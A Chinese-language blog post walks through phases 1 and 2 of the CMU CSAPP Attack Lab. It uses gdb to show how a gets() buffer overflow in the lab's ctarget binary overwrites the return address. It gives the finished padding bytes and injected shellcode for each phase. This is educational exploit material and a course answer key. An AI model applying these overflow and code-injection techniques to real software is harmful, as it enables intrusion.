---
layout: post
title: "03 attack lab"
category: Csapp Lab(cmu 15-213)
---

CSAPP attack lab

# Attack_LAB

![image-20231219160940326](/assets/Attack_LAB/image-20231219160940326.png)

应该从文件里读取十六进制的结果

## phase_1

```c
test(){
	getbuf()
     xxx
	return
}
```

原本getbuf之后，根据ret地址，执行xxx代码，目的是通过getbuf溢出修改ret地址，走到目标代码

gdb调试ctarget，使用-q 不连接服务器

![image-20231219161220379](/assets/Attack_LAB/image-20231219161220379.png)

test汇编

![image-20231219161110542](/assets/Attack_LAB/a1.png)

test调用 call getbuf 之后栈帧结构，由于getbuf执行完之后，需要执行下一行代码（0x401976），所以把代码地址保存再栈上面如下0x5561dca0 - 0x5561dca2,一个地址保存一字节，小端存储（低地址0x5561dca0保存最低位76）

![image-20231219161110542](/assets/Attack_LAB/attack0.png)

可以验证

![image-20231219170202518](/assets/Attack_LAB/attack2.png)

getbuf汇编

![image-20231219161053446](/assets/Attack_LAB/a4.png)



进入getbuf，call gets之前的栈帧结构

可以看到rsp，往下40(0x28)个单位，变成了0x5561dc78

![image-20231219161053446](/assets/Attack_LAB/a3.png)



走到gets方法 输入0123456789查看栈的样子,从rsp（0x5561dc78）作为起点，开始填充我们输入的内容

![image-20231219170202518](/assets/Attack_LAB/a5.png)

可以验证

![image-20231219170202518](/assets/Attack_LAB/attack1.png)

所以我们要输入43的字符，40个填充buff缓冲区，剩下3个40 17 c0填充ret指向touch1的地址

由于提示读取文件所以要得到0x4017c0,文本中应该是 

c0 17 40

![image-20231219170202518](/assets/Attack_LAB/image-20231219170202518.png)

所以答案,保存在ctarget1.txt中

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

![image-20231219170412388](/assets/Attack_LAB/image-20231219170412388.png)

## phase_2

ret：弹出rsp指向的地址，作为下一条要执行代码的地址。会让rsp+8



要执行的目标代码

![image-20231220112823637](/assets/Attack_LAB/image-20231220112823637.png)

![image-20231220110724164](/assets/Attack_LAB/image-20231220110724164.png)

把汇编转化为机器代码（十六进制的表示）

![image-20231220113007901](/assets/Attack_LAB/image-20231220113007901.png)

48 c7 c7 fa 97 b9 59 68 ec 17 40 00  c3

填入buff文本，

![image-20231220112616836](/assets/Attack_LAB/image-20231220112616836.png)

并生成十六进制文件

![image-20231220112720748](/assets/Attack_LAB/image-20231220112720748.png)

执行代码

![image-20231220112751906](/assets/Attack_LAB/image-20231220112751906.png)



![image-20231220113837068](/assets/Attack_LAB/image-20231220113837068.png)
